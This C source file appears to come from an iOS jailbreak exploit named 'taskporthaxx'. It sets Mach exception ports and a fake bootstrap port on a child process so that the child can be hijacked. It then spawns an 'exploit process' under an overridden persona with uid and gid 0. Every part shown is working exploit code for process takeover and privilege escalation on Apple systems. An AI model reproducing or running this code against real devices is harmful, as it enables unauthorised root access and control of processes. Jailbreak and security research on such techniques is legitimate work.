#include "taskporthaxx.h"
int child_execve(char *path) {
    mach_port_t exception_port = MACH_PORT_NULL;
    mach_port_t fake_bootstrap_port = MACH_PORT_NULL;

    const char *exception_server_id_str = getenv("EXCEPTION_SERVER_ID");
    int thread_id = 0;
    if (exception_server_id_str != NULL) {
        thread_id = atoi(exception_server_id_str);
    }

    char exception_service_name[128];
    char bootstrap_service_name[128];
    snprintf(exception_service_name, sizeof(exception_service_name), "com.roothide.bootstrap.exception_server.%d", thread_id);
    snprintf(bootstrap_service_name, sizeof(bootstrap_service_name), "com.roothide.bootstrap.fake_bootstrap_port.%d", thread_id);

    bootstrap_look_up(bootstrap_port, exception_service_name, &exception_port);
    assert(exception_port != MACH_PORT_NULL);
    bootstrap_look_up(bootstrap_port, bootstrap_service_name, &fake_bootstrap_port);
    assert(fake_bootstrap_port != MACH_PORT_NULL);
    
    task_set_exception_ports(mach_task_self(),
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port,
        EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
        ARM_THREAD_STATE64);
    task_set_bootstrap_port(mach_task_self(), fake_bootstrap_port);
    
    posix_spawnattr_t attr;
    if(posix_spawnattr_init(&attr) != 0) {
        perror("posix_spawnattr_init");
        return 1;
    }
    
    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
        perror("posix_spawnattr_set_flags");
        return 1;
    }
    
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){0, bootstrap_port, fake_bootstrap_port}, 3);
    posix_spawnattr_setexceptionports_np(&attr,
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port, EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    char *argv2[] = { path, NULL };
    posix_spawn(NULL, argv2[0], NULL, &attr, argv2, environ);
    perror("posix_spawn");
    return 1;
}

pid_t spawn_exploit_process(mach_port_t exception_port) {
    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
    posix_spawnattr_set_persona_uid_np(&attr, 0);
    posix_spawnattr_set_persona_gid_np(&attr, 0);
    //posix_spawnattr_set_ptrauth_task_port_np(&attr, mach_task_self());
    char *argv[] = {**_NSGetArgv(), "child", NULL};
    int ret = posix_spawn(&pid, argv[0], NULL, &attr, argv, environ);
    if (ret) {
        perror("posix_spawn");
        return 0;
    }
    printf("Spawned exploit process with PID %d\n", pid);
    return pid;
}


